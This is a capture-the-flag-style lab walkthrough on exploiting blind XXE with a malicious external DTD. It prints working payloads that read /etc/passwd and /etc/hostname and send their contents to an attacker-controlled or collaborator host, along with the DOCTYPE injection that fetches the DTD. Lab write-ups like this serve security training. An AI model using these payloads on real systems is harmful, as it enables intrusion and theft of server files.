@@ -1,0 +1,106 @@
+# Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+## Lab Description :
+![Cap dashboard screenshot](xxe-level-5-1.png)
+
+## Overview :
+It involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
+
+An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+This DTD carries out the following steps:
+
+Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
+Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
+Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
+Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.
+The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:
+
+``http://web-attacker.com/malicious.dtd``
+Finally, the attacker must submit the following XXE payload to the vulnerable application:
+
+``<!DOCTYPE foo [<!ENTITY % xxe SYSTEM"http://web-attacker.com/malicious.dtd"> %xxe;]>``
+
+This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server.
+
+In some cases, when performing a blind XXE (XML External Entity) attack to retrieve data from the /etc/passwd file, only a single line of the file may be obtained in the response.
+
+The limited response that you observe could occur due to the way the application processes the XML and constructs the response. It might be designed to include only a single line of the file, truncating the content to prevent the disclosure of sensitive information.
+
+For this we can use an FTP server to get all the contents of the file .
+
+FTP sever tool - https://github.com/lc/230-OOB
+
+## Solution :
+Clicking on checkstock feature , browser sends the following request.
+```html
+POST /product/stock HTTP/2
+Host: 0a5c0075035d3461824ebb3700d50033.web-security-academy.net
+Cookie: session=2K3jJ6C0GNurtpvuyrqmYZYeIU1ITlX1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0a5c0075035d3461824ebb3700d50033.web-security-academy.net/product?productId=2
+Content-Type: application/xml
+Content-Length: 107
+Origin: https://0a5c0075035d3461824ebb3700d50033.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+<?xml version="1.0" encoding="UTF-8"?>
+ <stockCheck>
+  <productId>2</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+In order to solve the lab, we need to make the application to fetch our malicious DTD file with the payload to retreive /etc/hostname & then send the exfiltrated data back to our server.
+
+Steps -
+The application parses the XML entitiy & tries to fetch the malicious DTD hosted at exploit server
+Payload of exploit server gets executed. Means the application retreives the /etc/hostname of the vulnerable server.
+THe vulnerable server now sends the exfiltrated data back to our collaborator server.
+Craft the payload
+In the request to check the stock, we can insert the following external entity definition in between the XML declaration and the stockCheck element:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+ <!DOCTYPE example [<!ENTITY % xxe SYSTEM "http://exploit-0a1800a6032c20998658e88b0120001e.exploit-server.net/exploit"> %xxe;]>
+ <stockCheck>
+  <productId>2</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+Create a malicious DTD -
+On the exploit server create a malicious DTD file with the following contents,
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ytv10aart4un8pz41up9szpvvm1dp2.oastify.com/?%file;'>">
+%ent;
+%exfiltrate;
+```
+Host this malicious.dtd file in our exploit server.
+
+NOTE- We need to send the exfiltrated data (/etc/hostname) back to our collaborator server. So provide colab server's address.
+
+When we send the request, we get a response stating that - XML parsing error
+
+![Cap dashboard screenshot](xxe-level-5-2.png)
+
+But if we check our collaborator server, we can see that few HTTP & DNS requests were made. The HTTP request made to our server contains the output of our payload in the GET request header .
+
+/etc/hostname - 6837f702d700
+
+![Cap dashboard screenshot](xxe-level-5-3.png)
+
+Submit the hostname to solve the lab.
+
+![Cap dashboard screenshot](xxe-level-5-4.png)
+
+#### Visit The Next Page For The Next Level :)
